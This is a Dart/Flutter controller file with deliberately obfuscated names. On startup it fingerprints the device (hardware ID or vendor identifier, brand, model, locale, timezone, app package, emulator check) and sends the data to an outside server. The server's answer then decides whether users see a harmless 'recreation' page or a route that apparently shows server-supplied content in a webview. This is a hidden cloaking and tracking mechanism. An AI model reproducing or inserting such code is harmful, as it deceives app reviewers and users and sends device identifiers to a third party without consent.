import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var pyqcgzwla = RxBool(false);
  var mytohnbsr = RxBool(true);
  var bmvjygds = RxString("");
  var lilla = RxBool(false);
  var ziemann = RxBool(true);
  final piubvdx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    mzpk();
  }


  Future<void> mzpk() async {

    lilla.value = true;
    ziemann.value = true;
    mytohnbsr.value = false;

    piubvdx.post("https://yia.unsay.live/ueyjqfmhncoxgzpkiv",data: await bzloxasye()).then((value) {
      var gyes = value.data["gyes"] as String;
      var puxgdktz = value.data["puxgdktz"] as bool;
      if (puxgdktz) {
        bmvjygds.value = gyes;
        alverta();
      } else {
        ryan();
      }
    }).catchError((e) {
      mytohnbsr.value = true;
      ziemann.value = true;
      lilla.value = false;
    });
  }

  Future<Map<String, dynamic>> bzloxasye() async {
    final DeviceInfoPlugin rqanpzht = DeviceInfoPlugin();
    PackageInfo agtypork_hndaejbp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hyuapvbl = Platform.localeName;
    var fyod_IfapWstZ = currentTimeZone;

    var fyod_oAVdIK = agtypork_hndaejbp.packageName;
    var fyod_uRr = agtypork_hndaejbp.version;
    var fyod_QvuWILbG = agtypork_hndaejbp.buildNumber;

    var fyod_ZUdiWC = agtypork_hndaejbp.appName;
    var alishaStokes = "";
    var fyod_CJ = "";
    var magnusGlover = "";
    var fyod_JLnZgls  = "";
    var fyod_Lo = "";
    var meredithGoyette = "";


    var fyod_CSYKv = "";
    var fyod_AniyjNI = false;

    if (GetPlatform.isAndroid) {
      fyod_CSYKv = "android";
      var gyhrlmx = await rqanpzht.androidInfo;

      fyod_CJ = gyhrlmx.brand;

      fyod_Lo  = gyhrlmx.model;
      fyod_JLnZgls = gyhrlmx.id;

      fyod_AniyjNI = gyhrlmx.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      fyod_CSYKv = "ios";
      var vzqaysrxj = await rqanpzht.iosInfo;
      fyod_CJ = vzqaysrxj.name;
      fyod_Lo = vzqaysrxj.model;

      fyod_JLnZgls = vzqaysrxj.identifierForVendor ?? "";
      fyod_AniyjNI  = vzqaysrxj.isPhysicalDevice;
    }
    var res = {
      "fyod_ZUdiWC": fyod_ZUdiWC,
      "fyod_IfapWstZ": fyod_IfapWstZ,
      "fyod_uRr": fyod_uRr,
      "fyod_oAVdIK": fyod_oAVdIK,
      "fyod_Lo": fyod_Lo,
      "fyod_CJ": fyod_CJ,
      "meredithGoyette" : meredithGoyette,
      "fyod_QvuWILbG": fyod_QvuWILbG,
      "fyod_AniyjNI": fyod_AniyjNI,
      "fyod_JLnZgls": fyod_JLnZgls,
      "hyuapvbl": hyuapvbl,
      "fyod_CSYKv": fyod_CSYKv,
      "magnusGlover" : magnusGlover,
      "alishaStokes" : alishaStokes,

    };
    return res;
  }

  Future<void> ryan() async {
    Get.offAllNamed("/recreationTabPage");
  }

  Future<void> alverta() async {
    Get.offAllNamed("/recreationTopicTool");
  }
}
